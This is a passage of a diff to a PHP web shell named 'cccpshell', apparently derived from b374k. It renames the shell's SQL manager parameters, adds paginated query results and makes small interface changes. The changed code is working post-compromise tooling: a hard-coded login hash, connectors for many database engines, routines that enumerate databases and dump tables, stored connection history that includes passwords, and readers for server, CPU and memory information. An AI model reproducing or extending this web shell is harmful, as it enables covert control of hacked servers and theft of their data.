@@ -12,7 +12,8 @@ $config['date'] = 'd/m/Y';
 $config['datetime'] = 'd/m/Y H:i:s';
 $config['hd_lines'] = 16;   //lines in hex preview file
 $config['hd_rows'] = 32;    //16, 24 or 32 bytes in one line
-$config['FMLimit'] = 100;   //file manager item limit. false = No limit
+$config['FMLimit'] = 4;   //file manager item limit. false = No limit
+$config['SQLLimit'] = 50;   //sql manager result limit.
 $config['checkBDel'] = true;//Check Before Delete: true = On 
 $config['consNames'] = array('post'=>'dsr', 'slogin'=>'cccpshell', 'sqlclog'=>'conlog'); //Constants names
 $config['sPass'] = '775a373fb43d8101818d45c28036df87'; // md5(pass) //cccpshell
@@ -643,7 +644,9 @@ function filesize64($file){
 }
 
 function genPaginator($c, $t = -1, $fm = true) {
-	$l = 'ajaxLoad("me=sql&pg=';
+	global $p;
+	
+	$l = 'dbexec("' . (isset($p['code']) ? $p['code'] : '') . '&pg=';
 	if ($fm)
 		$l = 'ajaxLoad("me=file&dir=" + euc(d.getElementById("base").value) + "&pg=';
 	
@@ -1043,7 +1046,7 @@ if (isset($p['me']) && $p['me'] === 'loader'){ //esta es la buena
 	function dbexec(c){
 		empty("dbRes");
 		append("dbRes", "<div class=\'loading\'></div>");
-		ajax(serialize(d.forms[0]) + \'&sqlcode=\' + c, function(r){
+		ajax(serialize(d.forms[0]) + \'&code=\' + c, function(r){
 			empty("dbRes");
 			append("dbRes", r);
 			updateUI();
@@ -1075,15 +1078,15 @@ if (isset($p['me']) && $p['me'] === 'loader'){ //esta es la buena
 			if (sessionStorage.getItem("' . $config['consNames']['sqlclog'] . '") != null)
 				o = JSON.parse(sessionStorage.getItem("' . $config['consNames']['sqlclog'] . '"));
 				
-			o.history.push({"sqltype": d.getElementById("sqltype").value, "sqlhost": d.getElementById("sqlhost").value, 
-				"sqlport": d.getElementById("sqlport").value, "sqluser": d.getElementById("sqluser").value, "sqlpass": d.getElementById("sqlpass").value});
+			o.history.push({"type": d.getElementById("type").value, "host": d.getElementById("host").value, 
+				"port": d.getElementById("port").value, "user": d.getElementById("user").value, "pass": d.getElementById("pass").value});
 			sessionStorage.setItem("' . $config['consNames']['sqlclog'] . '", JSON.stringify(o));
 		} else if (sessionStorage.getItem("' . $config['consNames']['sqlclog'] . '") != null) {
 			s = "";
 			o = JSON.parse(sessionStorage.getItem("' . $config['consNames']['sqlclog'] . '"));
 			for (i = 0; i < o.history.length; i++){
-				u = "me=sql&sqlhost=" + o.history[i].sqlhost + "&sqlport=" + o.history[i].sqlport + "&sqluser=" + o.history[i].sqluser + "&sqlpass=" + o.history[i].sqlpass + "&sqltype=" + o.history[i].sqltype;
-				s += "[" + o.history[i].sqltype.toUpperCase() + "] " + o.history[i].sqluser + "@" + o.history[i].sqlhost + "<span style=\'float:right;\'><a href=\'#\' onclick=\'ajaxLoad(&quot;" + u + "&quot;)\'>' . tText('go', 'Go!') . '</a></span><br>";
+				u = "me=sql&host=" + o.history[i].host + "&port=" + o.history[i].port + "&user=" + o.history[i].user + "&pass=" + o.history[i].pass + "&type=" + o.history[i].type;
+				s += "[" + o.history[i].type.toUpperCase() + "] " + o.history[i].user + "@" + o.history[i].host + "<span style=\'float:right;\'><a href=\'#\' onclick=\'ajaxLoad(&quot;" + u + "&quot;)\'>' . tText('go', 'Go!') . '</a></span><br>";
 			}
 			
 			if (s != "") prepend("content", "<div id=\'uires\' class=\'uires\'>" + s + "</div>");
@@ -1248,7 +1251,7 @@ if (isset($p['me']) && $p['me'] === 'loader'){ //esta es la buena
 			background:#7d7474;
 			font-weight:bold;
 			text-align:center;
-			cursor:move;
+			cursor: move;
 			padding: 3px;
 		}
 		.boxtitle a, .boxtitle a:hover{
@@ -1369,6 +1372,7 @@ if (isset($p['me']) && $p['me'] === 'loader'){ //esta es la buena
 			padding:0;
 		}
 			
+		.touch{cursor:pointer;}
 		.my{color:yellow;}
 		.mg{color:green;}
 		.mr{color:red;}
@@ -1440,13 +1444,12 @@ if (isset($p['me']) && $p['me'] === 'loader'){ //esta es la buena
 		div.paginator a {
 			padding: 2px 5px 2px 5px; 
 			margin: 2px;
-			border: 1px solid #000000;
-			text-decoration: none; # no underline 
-			color: #000000;
+			border: 1px solid #000;
+			text-decoration: none;
 		}
 		
 		div.paginator a:hover, div.paginator a:active {
-			border: 1px solid #000000;
+			border: 1px solid #000;
 			background-color:#000;
 			color: #fff;
 		}
@@ -1454,17 +1457,17 @@ if (isset($p['me']) && $p['me'] === 'loader'){ //esta es la buena
 		div.paginator span.current {
 			padding: 2px 5px 2px 5px;
 			margin: 2px; 
-			border: 1px solid #000000;
+			border: 1px solid #000;
 			font-weight: bold;
-			background-color: #000000;
-			color: #FFF;
+			background-color: #000;
+			color: #fff;
 		}
 		  
 		div.paginator span.disabled {
 			padding: 2px 5px 2px 5px;
 			margin: 2px;
-			border: 1px solid #EEE; 
-			color: #DDD; 
+			border: 1px solid #eee; 
+			color: #ddd; 
 		}
 	  </style>
 	</head>
@@ -2119,9 +2122,9 @@ if (isset($p['me']) && $p['me'] === 'file'){
 		$sBuff .= '<table id="sort" class="explore sortable">
 			<thead><tr data-path="' . getUpPath($currentdir) . '" class="alt1">
 			<td class="alt1 sorttable_nosort">' . mLink('<div class="image lnk"></div>', 'godir(this, false)') . '</td>
-			<td width="70%"><b>' . tText('name', 'Name') . '</b></td>
-			<td><b>' . tText('date', 'Date') . '</b></td>
-			<td><b>' . tText('size', 'Size') . '</b></td>
+			<td class="touch" width="70%"><b>' . tText('name', 'Name') . '</b></td>
+			<td class="touch"><b>' . tText('date', 'Date') . '</b></td>
+			<td class="touch"><b>' . tText('size', 'Size') . '</b></td>
 			' . (! $isWIN ? '<td><b>' . tText('chmodchown', 'Chmod/Chown') . '</b></td>' : '') . '
 			<td width="120px"><b>' . tText('actions', 'Actions') . '</b></td>
 			</tr></thead>
@@ -2206,136 +2209,136 @@ if (isset($p['me']) && $p['me'] === 'srm'){
 if (isset($p['me']) && $p['me'] === 'sql'){
 	# SQL
 	//based on b374k by DSR!
-	function sql_connect($sqltype, $sqlhost, $sqluser, $sqlpass){
-		if ($sqltype === 'mysql'){
-			$hosts = explode(':', $sqlhost);
+	function sql_connect($type, $host, $user, $pass){
+		if ($type === 'mysql'){
+			$hosts = explode(':', $host);
 			if(count($hosts)==2) $host_str = $hosts[0].':'.$hosts[1];
-			else $host_str = $sqlhost;
-			if(function_exists('mysqli_connect')) return @mysqli_connect($host_str, $sqluser, $sqlpass);
-			elseif(function_exists('mysql_connect')) return @mysql_connect($host_str, $sqluser, $sqlpass);
-		} elseif($sqltype === 'mssql'){
-			if(function_exists('mssql_connect')) return @mssql_connect($sqlhost, $sqluser, $sqlpass);
+			else $host_str = $host;
+			if(function_exists('mysqli_connect')) return @mysqli_connect($host_str, $user, $pass);
+			elseif(function_exists('mysql_connect')) return @mysql_connect($host_str, $user, $pass);
+		} elseif($type === 'mssql'){
+			if(function_exists('mssql_connect')) return @mssql_connect($host, $user, $pass);
 			elseif(function_exists('sqlsrv_connect')){
-				$coninfo = array('UID'=>$sqluser, 'PWD'=>$sqlpass);
-				return @sqlsrv_connect($sqlhost,$coninfo);
+				$coninfo = array('UID'=>$user, 'PWD'=>$pass);
+				return @sqlsrv_connect($host,$coninfo);
 			}
-		} elseif($sqltype === 'pgsql'){
-			$hosts = explode(':', $sqlhost);
+		} elseif($type === 'pgsql'){
+			$hosts = explode(':', $host);
 			if(count($hosts)==2) $host_str = 'host='.$hosts[0].' port='.$hosts[1];
-			else $host_str = 'host='.$sqlhost;
-			if(function_exists('pg_connect')) return @pg_connect($host_str.' user='.$sqluser.' password='.$sqlpass);
-		} elseif($sqltype === 'oracle'){ 
-			if(function_exists('oci_connect')) return @oci_connect($sqluser, $sqlpass, $sqlhost); 
-		} elseif($sqltype === 'sqlite3'){
-			if(class_exists('SQLite3')) if(!empty($sqlhost)) return new SQLite3($sqlhost);
-		} elseif($sqltype === 'sqlite'){ 
-			if(function_exists('sqlite_open')) return @sqlite_open($sqlhost); 
-		} elseif($sqltype === 'odbc'){ 
-			if(function_exists('odbc_connect')) return @odbc_connect($sqlhost, $sqluser, $sqlpass);
-		} elseif($sqltype === 'pdo'){
-			if(class_exists('PDO')) if(!empty($sqlhost)) return new PDO($sqlhost, $sqluser, $sqlpass);
+			else $host_str = 'host='.$host;
+			if(function_exists('pg_connect')) return @pg_connect($host_str.' user='.$user.' password='.$pass);
+		} elseif($type === 'oracle'){ 
+			if(function_exists('oci_connect')) return @oci_connect($user, $pass, $host); 
+		} elseif($type === 'sqlite3'){
+			if(class_exists('SQLite3')) if(!empty($host)) return new SQLite3($host);
+		} elseif($type === 'sqlite'){ 
+			if(function_exists('sqlite_open')) return @sqlite_open($host); 
+		} elseif($type === 'odbc'){ 
+			if(function_exists('odbc_connect')) return @odbc_connect($host, $user, $pass);
+		} elseif($type === 'pdo'){
+			if(class_exists('PDO')) if(!empty($host)) return new PDO($host, $user, $pass);
 		}
 		return false;
 	}
 
-	function sql_query($sqltype, $query, $con){
-		if ($sqltype === 'mysql'){
+	function sql_query($type, $query, $con){
+		if ($type === 'mysql'){
 			if(function_exists('mysqli_query')) return mysqli_query($con,$query);
 			elseif(function_exists('mysql_query')) return mysql_query($query);
-		} elseif($sqltype === 'mssql'){
+		} elseif($type === 'mssql'){
 			if(function_exists('mssql_query')) return mssql_query($query);
 			elseif(function_exists('sqlsrv_query')) return sqlsrv_query($con,$query);
-		} elseif($sqltype === 'pgsql') return pg_query($query);
-		elseif($sqltype === 'oracle') return oci_execute(oci_parse($con, $query));
-		elseif($sqltype === 'sqlite3') return $con->query($query);
-		elseif($sqltype === 'sqlite') return sqlite_query($con, $query);
-		elseif($sqltype === 'odbc') return odbc_exec($con, $query);
-		elseif($sqltype === 'pdo') return $con->query($query);
+		} elseif($type === 'pgsql') return pg_query($query);
+		elseif($type === 'oracle') return oci_execute(oci_parse($con, $query));
+		elseif($type === 'sqlite3') return $con->query($query);
+		elseif($type === 'sqlite') return sqlite_query($con, $query);
+		elseif($type === 'odbc') return odbc_exec($con, $query);
+		elseif($type === 'pdo') return $con->query($query);
 	}
 
-	function sql_num_fields($sqltype, $result, $con){
-		if ($sqltype === 'mysql'){
+	function sql_num_fields($type, $result, $con){
+		if ($type === 'mysql'){
 			if(function_exists('mysqli_field_count')) return mysqli_field_count($con);
 			elseif (function_exists('mysql_num_fields')) return mysql_num_fields($result);
-		} elseif($sqltype === 'mssql'){
+		} elseif($type === 'mssql'){
 			if(function_exists('mssql_num_fields')) return mssql_num_fields($result);
 			elseif(function_exists('sqlsrv_num_fields')) return sqlsrv_num_fields($result);
-		} elseif($sqltype === 'pgsql') return pg_num_fields($result);
-		elseif($sqltype === 'oracle') return oci_num_fields($result);
-		elseif($sqltype === 'sqlite3') return $result->numColumns();
-		elseif($sqltype === 'sqlite') return sqlite_num_fields($result);
-		elseif($sqltype === 'odbc') return odbc_num_fields($result);
-		elseif($sqltype === 'pdo') return $result->columnCount();
+		} elseif($type === 'pgsql') return pg_num_fields($result);
+		elseif($type === 'oracle') return oci_num_fields($result);
+		elseif($type === 'sqlite3') return $result->numColumns();
+		elseif($type === 'sqlite') return sqlite_num_fields($result);
+		elseif($type === 'odbc') return odbc_num_fields($result);
+		elseif($type === 'pdo') return $result->columnCount();
 	}
 
-	function sql_field_name($sqltype,$result,$i){
-		if ($sqltype === 'mysql'){
+	function sql_field_name($type,$result,$i){
+		if ($type === 'mysql'){
 			if(function_exists('mysqli_fetch_fields')){
 				$metadata = mysqli_fetch_fields($result);
 				if(is_array($metadata)) return $metadata[$i]->name;
 			} elseif (function_exists('mysql_field_name')) return mysql_field_name($result,$i);
-		} elseif($sqltype === 'mssql'){
+		} elseif($type === 'mssql'){
 			if(function_exists('mssql_field_name')) return mssql_field_name($result,$i);
 			elseif(function_exists('sqlsrv_field_metadata')){
 				$metadata = sqlsrv_field_metadata($result);
 				if(is_array($metadata)) return $metadata[$i]['Name'];
 			}
-		} elseif($sqltype === 'pgsql') return pg_field_name($result,$i);
-		elseif($sqltype === 'oracle') return oci_field_name($result,$i+1);
-		elseif($sqltype === 'sqlite3') return $result->columnName($i);
-		elseif($sqltype === 'sqlite') return sqlite_field_name($result,$i);
-		elseif($sqltype === 'odbc') return odbc_field_name($result,$i+1);
-		elseif($sqltype === 'pdo'){
+		} elseif($type === 'pgsql') return pg_field_name($result,$i);
+		elseif($type === 'oracle') return oci_field_name($result,$i+1);
+		elseif($type === 'sqlite3') return $result->columnName($i);
+		elseif($type === 'sqlite') return sqlite_field_name($result,$i);
+		elseif($type === 'odbc') return odbc_field_name($result,$i+1);
+		elseif($type === 'pdo'){
 			$res = $result->getColumnMeta($i);
 			return $res['name'];
 		}
 	}
 
-	function sql_fetch_data($sqltype,$result){
-		if ($sqltype === 'mysql'){
+	function sql_fetch_data($type,$result){
+		if ($type === 'mysql'){
 			if(function_exists('mysqli_fetch_row')) return mysqli_fetch_row($result);
 			elseif(function_exists('mysql_fetch_row')) return mysql_fetch_row($result);
-		} elseif($sqltype === 'mssql'){
+		} elseif($type === 'mssql'){
 			if(function_exists('mssql_fetch_row')) return mssql_fetch_row($result);
 			elseif(function_exists('sqlsrv_fetch_array')) return sqlsrv_fetch_array($result,1);
-		} elseif($sqltype === 'pgsql') return pg_fetch_row($result);
-		elseif($sqltype === 'oracle') return oci_fetch_row($result);
-		elseif($sqltype === 'sqlite3') return $result->fetchArray(1);
-		elseif($sqltype === 'sqlite') return sqlite_fetch_array($result,1);
-		elseif($sqltype === 'odbc') return odbc_fetch_array($result);
-		elseif($sqltype === 'pdo') return $result->fetch(2);
+		} elseif($type === 'pgsql') return pg_fetch_row($result);
+		elseif($type === 'oracle') return oci_fetch_row($result);
+		elseif($type === 'sqlite3') return $result->fetchArray(1);
+		elseif($type === 'sqlite') return sqlite_fetch_array($result,1);
+		elseif($type === 'odbc') return odbc_fetch_array($result);
+		elseif($type === 'pdo') return $result->fetch(2);
 	}
 
-	function sql_num_rows($sqltype,$result){
-		if ($sqltype === 'mysql'){
+	function sql_num_rows($type,$result){
+		if ($type === 'mysql'){
 			if(function_exists('mysqli_num_rows')) return mysqli_num_rows($result);
 			elseif(function_exists('mysql_num_rows')) return mysql_num_rows($result);
-		} elseif($sqltype === 'mssql'){
+		} elseif($type === 'mssql'){
 			if(function_exists('mssql_num_rows')) return mssql_num_rows($result);
 			elseif(function_exists('sqlsrv_num_rows')) return sqlsrv_num_rows($result);
-		} elseif($sqltype === 'pgsql') return pg_num_rows($result);
-		elseif($sqltype === 'oracle') return oci_num_rows($result);
-		elseif($sqltype === 'sqlite3'){
+		} elseif($type === 'pgsql') return pg_num_rows($result);
+		elseif($type === 'oracle') return oci_num_rows($result);
+		elseif($type === 'sqlite3'){
 			$metadata = $result->fetchArray();
 			if(is_array($metadata)) return $metadata['count'];
-		} elseif($sqltype === 'sqlite') return sqlite_num_rows($result);
-		elseif($sqltype === 'odbc') return odbc_num_rows($result);
-		elseif($sqltype === 'pdo') return $result->rowCount();
+		} elseif($type === 'sqlite') return sqlite_num_rows($result);
+		elseif($type === 'odbc') return odbc_num_rows($result);
+		elseif($type === 'pdo') return $result->rowCount();
 	}
 
-	function sql_close($sqltype,$con){
-		if ($sqltype === 'mysql'){
+	function sql_close($type,$con){
+		if ($type === 'mysql'){
 			if(function_exists('mysqli_close')) return mysqli_close($con);
 			elseif(function_exists('mysql_close')) return mysql_close($con);
-		} elseif($sqltype === 'mssql'){
+		} elseif($type === 'mssql'){
 			if(function_exists('mssql_close')) return mssql_close($con);
 			elseif(function_exists('sqlsrv_close')) return sqlsrv_close($con);
-		} elseif($sqltype === 'pgsql') return pg_close($con);
-		elseif($sqltype === 'oracle') return oci_close($con);
-		elseif($sqltype === 'sqlite3') return $con->close();
-		elseif($sqltype === 'sqlite') return sqlite_close($con);
-		elseif($sqltype === 'odbc') return odbc_close($con);
-		elseif($sqltype === 'pdo') return $con = null;
+		} elseif($type === 'pgsql') return pg_close($con);
+		elseif($type === 'oracle') return oci_close($con);
+		elseif($type === 'sqlite3') return $con->close();
+		elseif($type === 'sqlite') return sqlite_close($con);
+		elseif($type === 'odbc') return odbc_close($con);
+		elseif($type === 'pdo') return $con = null;
 	}
 	 
 	/*
@@ -2400,80 +2403,83 @@ if (isset($p['me']) && $p['me'] === 'sql'){
 		}
 	*/
 
-	if (isset($p['sqlcode'])){
-		$sBuff = '';
-		$con = sql_connect($p['sqltype'], $p['sqlhost'], $p['sqluser'], $p['sqlpass']);
-		foreach(explode(';', $p['sqlcode']) as $query){
-			if (trim($query) !== ''){
-				$res = sql_query($p['sqltype'],$query,$con);
-				if ($res !== false){
-					$sBuff .= '<hr /><p style="padding:0;margin:6px 10px;font-weight:bold;">' . hsc($query) . ';&nbsp;&nbsp;<span>[ ok ]</span></p>';
+	if (isset($p['code'])){
+		if (!isset($p['pg'])) $p['pg'] = 1;
+		$start = ((int)$p['pg'] - 1) * $config['SQLLimit'];
+		$oracleLimit = $start + $config['SQLLimit'];
 
-					if (!is_bool($res)){
-						$sBuff .= '<table id="sort" class="explore sortable" style="width:100%;"><tr>';
-						for ($i = 0; $i<sql_num_fields($p['sqltype'], $res, $con); $i++)
-							$sBuff .= '<th>' . @hsc(sql_field_name($p['sqltype'], $res, $i)) . '</th>';
+		$sBuff = '';
+		$con = sql_connect($p['type'], $p['host'], $p['user'], $p['pass']);
+		foreach(explode(';', $p['code']) as $query){
+			if (trim($query) !== ''){
+				$query = str_replace(array('{start}', '{limit}', '{oraclelimit}'), array($start, $config['SQLLimit'], $oracleLimit), $query);
+				$sBuff .= '<hr /><p><b>' . tText('sq8', 'Executed') . ':</b> ' . hsc($query) . ';&nbsp;&nbsp;';
+				$res = sql_query($p['type'], $query, $con);
+				if ($res !== false && !is_bool($res)){
+					$pag = genPaginator($p['pg'], -1, false) . '<br>';
+					$sBuff .= "<b>[ ok ]</b></p><br>{$pag}<table id='sort' class='explore sortable' style='width:100%;'><tr>";
+					
+					$t = sql_num_fields($p['type'], $res, $con);
+					for ($i = 0; $i < $t; $i++)
+						$sBuff .= '<th class="touch">' . @hsc(sql_field_name($p['type'], $res, $i)) . '</th>';
+					$sBuff .= '</tr>';
+					
+					while($rows = sql_fetch_data($p['type'], $res)){
+						$sBuff .= '<tr>';
+						foreach($rows as $r)
+							$sBuff .= '<td>' . @hsc($r) . '</td>';
 						$sBuff .= '</tr>';
-						while($rows=sql_fetch_data($p['sqltype'], $res)){
-							$sBuff .= '<tr>';
-							foreach($rows as $r){
-								//if ($r === '') $r = ' ';
-								$sBuff .= '<td>' . @hsc($r) . '</td>';
-							}
-							$sBuff .= '</tr>';
-						}
-						$sBuff .= '</table>';
 					}
+					
+					$sBuff .= "</table><br>{$pag}";
 				} else
-					$sBuff .= '<p style="padding:0;margin:6px 10px;font-weight:bold;">' . hsc($query) . ';&nbsp;&nbsp;&nbsp;<span>[ error ]</span></p>';
+					$sBuff .= '<b>[ ERROR ]</b></p><br>';
 			}
 		}
 		
 		sAjax($sBuff);
-	} elseif (isset($p['sqlhost'])){
-		$con = sql_connect($p['sqltype'], $p['sqlhost'], $p['sqluser'], $p['sqlpass']);
-		if ($con !== false){		
+	} elseif (isset($p['host'])){
+		$con = sql_connect($p['type'], $p['host'], $p['user'], $p['pass']);
+		if ($con !== false){
 			$sBuff .= '<form>' .
-				mHide('me', 'sql') . mHide('sqltype', $p['sqltype']) . 
-				mHide('sqlhost', $p['sqlhost']) . mHide('sqlport', $p['sqlport']) . 
-				mHide('sqluser', $p['sqluser']) . mHide('sqlpass', $p['sqlpass']) . '
-				</form><textarea id="sqlcode" name="sqlcode" class="bigarea" style="height: 100px;"></textarea>
-				<p>' . mSubmit(tText('go', 'Go!'), 'dbexec(d.getElementById(&quot;sqlcode&quot;).value)') . '&nbsp;&nbsp;
-				' . tText('sq4', 'Separate multiple commands with a semicolon') . ' <span>[ ; ]</span></p>
+				mHide('me', 'sql') . mHide('type', $p['type']) . 
+				mHide('host', $p['host']) . mHide('port', $p['port']) . 
+				mHide('user', $p['user']) . mHide('pass', $p['pass']) . '
+				</form><textarea id="code" name="code" class="bigarea" style="height: 100px;"></textarea>
+				<p>' . mSubmit(tText('go', 'Go!'), 'dbexec(d.getElementById(&quot;code&quot;).value)') . '&nbsp;&nbsp;
+				' . tText('sq4', 'Separate multiple commands with a semicolon') . ' <span>[ ; ]</span></p><br>
 				<table class="border" style="padding:0;"><tbody>
 				<tr><td id="dbNav" class="colFit borderright" style="vertical-align:top;">';
 				
-			if (($p['sqltype']!=='pdo') && ($p['sqltype']!=='odbc')){
-				if ($p['sqltype']==='mssql') $showdb = 'SELECT name FROM master..sysdatabases';
-				elseif ($p['sqltype']==='pgsql') $showdb = 'SELECT schema_name FROM information_schema.schemata';
-				elseif ($p['sqltype']==='oracle') $showdb = 'SELECT USERNAME FROM SYS.ALL_USERS ORDER BY USERNAME';
-				elseif ($p['sqltype']==='sqlite' || $p['sqltype']==='sqlite3') $showdb = "SELECT '".$p['sqlhost']."'";
+			if (($p['type']!=='pdo') && ($p['type']!=='odbc')){
+				if ($p['type']==='mssql') $showdb = 'SELECT name FROM master..sysdatabases';
+				elseif ($p['type']==='pgsql') $showdb = 'SELECT schema_name FROM information_schema.schemata';
+				elseif ($p['type']==='oracle') $showdb = 'SELECT USERNAME FROM SYS.ALL_USERS ORDER BY USERNAME';
+				elseif ($p['type']==='sqlite' || $p['type']==='sqlite3') $showdb = "SELECT '{$p['host']}'";
 				else $showdb = 'SHOW DATABASES'; //mysql
 
-				$res = sql_query($p['sqltype'], $showdb, $con);
+				$res = sql_query($p['type'], $showdb, $con);
 				if ($res !== false){
 					$bg = 0;
-					while($rowarr = sql_fetch_data($p['sqltype'], $res)){
+					while($rowarr = sql_fetch_data($p['type'], $res)){
 						foreach($rowarr as $rows){
-							$sBuff .= '<p class="notif ' . (($bg++ % 2 == 0) ? 'alt1' : 'alt2') . '" onclick=\'toggle("db_'.$rows.'")\'>'.$rows.'</p><div class="uiinfo" id="db_'.$rows.'"><table>';
+							$sBuff .= '<p class="touch notif ' . (($bg++ % 2 == 0) ? 'alt1' : 'alt2') . '" onclick=\'toggle("db_'.$rows.'")\'>'.$rows.'</p><div class="uiinfo" id="db_'.$rows.'"><table>';
 
-							if($p['sqltype']==='mssql') $showtbl = 'SELECT name FROM '.$rows."..sysobjects WHERE xtype = 'U'";
-							elseif($p['sqltype']==='pgsql') $showtbl = "SELECT table_name FROM information_schema.tables WHERE table_schema='".$rows."'";
-							elseif($p['sqltype']==='oracle') $showtbl = "SELECT TABLE_NAME FROM SYS.ALL_TABLES WHERE OWNER='".$rows."'";
-							elseif($p['sqltype']==='sqlite' || $p['sqltype']==='sqlite3') $showtbl = "SELECT name FROM sqlite_master WHERE type='table'";
-							else $showtbl = 'SHOW TABLES FROM '.$rows; //mysql
+							if($p['type']==='mssql') $showtbl = "SELECT name FROM {$rows}..sysobjects WHERE xtype = 'U'";
+							elseif($p['type']==='pgsql') $showtbl = "SELECT table_name FROM information_schema.tables WHERE table_schema='{$rows}'";
+							elseif($p['type']==='oracle') $showtbl = "SELECT TABLE_NAME FROM SYS.ALL_TABLES WHERE OWNER='{$rows}'";
+							elseif($p['type']==='sqlite' || $p['type']==='sqlite3') $showtbl = "SELECT name FROM sqlite_master WHERE type='table'";
+							else $showtbl = "SHOW TABLES FROM {$rows}"; //mysql
 
-							$res_t = sql_query($p['sqltype'], $showtbl, $con);
+							$res_t = sql_query($p['type'], $showtbl, $con);
 							if ($res_t != false){
-								$start = (isset($p['start']))? (int)$p['start'] : 0;
-								$limit = (isset($p['start']))? (int)$p['start'] : 100;
-								while($tablearr = sql_fetch_data($p['sqltype'], $res_t)){
+								while($tablearr = sql_fetch_data($p['type'], $res_t)){
 									foreach($tablearr as $tables){
-										if ($p['sqltype']==='mssql') $dumptbl = "SELECT TOP 100 * FROM {$rows}..{$tables}"; //TODO
-										elseif ($p['sqltype']==='pgsql') $dumptbl = "SELECT * FROM {$rows}.{$tables} LIMIT {$limit} OFFSET {$start}";
-										elseif ($p['sqltype']==='oracle') $dumptbl = "SELECT * FROM {$rows}.{$tables} WHERE ROWNUM BETWEEN {$start} AND " . ($start + $limit) . ";";
-										elseif ($p['sqltype']==='sqlite' || $p['sqltype']==='sqlite3') $dumptbl = "SELECT * FROM {$tables} LIMIT {$start}, {$limit}";
-										else $dumptbl = "SELECT * FROM {$rows}.{$tables} LIMIT {$start}, {$limit}"; //mysql
+										if ($p['type']==='mssql') $dumptbl = "SELECT TOP 100 * FROM {$rows}..{$tables}"; //TODO
+										elseif ($p['type']==='pgsql') $dumptbl = "SELECT * FROM {$rows}.{$tables} LIMIT {limit} OFFSET {start}";
+										elseif ($p['type']==='oracle') $dumptbl = "SELECT * FROM {$rows}.{$tables} WHERE ROWNUM BETWEEN {start} AND (oraclelimit);";
+										elseif ($p['type']==='sqlite' || $p['type']==='sqlite3') $dumptbl = "SELECT * FROM {$tables} LIMIT {start}, {limit}";
+										else $dumptbl = "SELECT * FROM {$rows}.{$tables} LIMIT {start}, {limit}"; //mysql
 											
 										$sBuff .= '<tr><td><a href="#" onclick="dbexec(\'' . $dumptbl . '\');return false;">' . $tables . '</a></td></tr>';
 									}
@@ -2490,7 +2496,7 @@ if (isset($p['me']) && $p['me'] === 'sql'){
 				</tr></tbody></table>';
 			if (isset($p['sqlinit'])) $sBuff .= mHide('jseval', 'dbhistory("s");');
 			
-			sql_close($p['sqltype'], $con);
+			sql_close($p['type'], $con);
 		} else
 			$sBuff .= sDialog('Unable to connect to database');
 	} else {
@@ -2511,12 +2517,12 @@ if (isset($p['me']) && $p['me'] === 'sql'){
 				</div>
 				<div class="table-row" style="text-align:left;">
 					<div class="table-col"><form>' .
-					mInput(array('n'=>'sqlhost', 'tt'=>'<span id="sh">' . tText('sq7', 'Host') . '</span>', 'nl'=>'', 'e'=>'style="width: 99%;"')) . 
-					'<span id="su">' . mInput(array('n'=>'sqluser', 'tt'=>tText('sq0', 'Username'), 'nl'=>'', 'e'=>'style="width: 99%;"'))  . '</span>' . 
-					'<span id="sp">' . mInput(array('n'=>'sqlpass', 'tt'=>tText('sq1', 'Password'), 'nl'=>'', 'e'=>'style="width: 99%;"'))  . '</span>' . 
-					'<span id="so">' . mInput(array('n'=>'sqlport', 'tt'=>tText('sq2', 'Port (optional)'), 'nl'=>'', 'e'=>'style="width: 99%;"')) . '</span>' .
-					mSelect('sqltype', $sqllist, false, false, 'dbengine(this)', tText('sq3', 'Engine')) . 
-					mHide('me', 'sql') . mHide('sqlinit', 'init') . mHide('jseval', 'dbengine(d.getElementById("sqltype"));dbhistory("v");') . 
+					mInput(array('n'=>'host', 'tt'=>'<span id="sh">' . tText('sq7', 'Host') . '</span>', 'nl'=>'', 'e'=>'style="width: 99%;"')) . 
+					'<span id="su">' . mInput(array('n'=>'user', 'tt'=>tText('sq0', 'Username'), 'nl'=>'', 'e'=>'style="width: 99%;"'))  . '</span>' . 
+					'<span id="sp">' . mInput(array('n'=>'pass', 'tt'=>tText('sq1', 'Password'), 'nl'=>'', 'e'=>'style="width: 99%;"'))  . '</span>' . 
+					'<span id="so">' . mInput(array('n'=>'port', 'tt'=>tText('sq2', 'Port (optional)'), 'nl'=>'', 'e'=>'style="width: 99%;"')) . '</span>' .
+					mSelect('type', $sqllist, false, false, 'dbengine(this)', tText('sq3', 'Engine')) . 
+					mHide('me', 'sql') . mHide('sqlinit', 'init') . mHide('jseval', 'dbengine(d.getElementById("type"));dbhistory("v");') . 
 					'<center>' . mSubmit(tText('go', 'Go!'), 'ajaxLoad(serialize(d.forms[0]));', 1) . '</center>' .
 					'</form></div>
 			</div>';
@@ -2697,7 +2703,7 @@ if (isset($p['me']) && $p['me'] === 'info'){
 	$dis_func = get_cfg_var('disable_functions');
     !$dis_func && $dis_func = 'No';
 
-	$sBuff .= "<p class='boxtitle' onclick=\"toggle('info');\" style='margin-bottom:8px;'>Resume</p>" .
+	$sBuff .= "<p class='boxtitle touch' onclick=\"toggle('info');\" style='margin-bottom:8px;'>Resume</p>" .
 		"<div id='info' style='margin-bottom:8px;display:none;'><table class='dataView'>";
     $info = array(
         'Server Time' => date('Y/m/d h:i:s', time()),
@@ -2740,7 +2746,7 @@ if (isset($p['me']) && $p['me'] === 'info'){
 		
 	//based on b374k work	
 	//server misc info
-	$sBuff .= "<p class='boxtitle' onclick=\"toggle('info_server');\" style='margin-bottom:8px;'>Server Info</p>" .
+	$sBuff .= "<p class='boxtitle touch' onclick=\"toggle('info_server');\" style='margin-bottom:8px;'>Server Info</p>" .
 		"<div id='info_server' style='margin-bottom:8px;display:none;'><table class='dataView'>";
 	if ($isWIN){
 		foreach (range("A", "Z") as $letter){
@@ -2794,7 +2800,7 @@ if (isset($p['me']) && $p['me'] === 'info'){
 	// cpu info
 	if(!$isWIN){
 		if ($i_buff=trim(read_file("/proc/cpuinfo"))){
-			$sBuff .= "<p class='boxtitle' onclick=\"toggle('info_cpu');\" style='margin-bottom:8px;'>CPU Info</p>" .
+			$sBuff .= "<p class='boxtitle touch' onclick=\"toggle('info_cpu');\" style='margin-bottom:8px;'>CPU Info</p>" .
 				"<div class='info' id='info_cpu' style='margin-bottom:8px;display:none;'>";
 			$i_buffs = explode("\n\n", $i_buff);
 			foreach($i_buffs as $i_buffss){
@@ -2817,7 +2823,7 @@ if (isset($p['me']) && $p['me'] === 'info'){
 
 		// mem info
 		if ($i_buff=trim(read_file("/proc/meminfo"))){
-			$sBuff .= "<p class='boxtitle' onclick=\"toggle('info_mem');\" style='margin-bottom:8px;'>Memory Info</p>" .
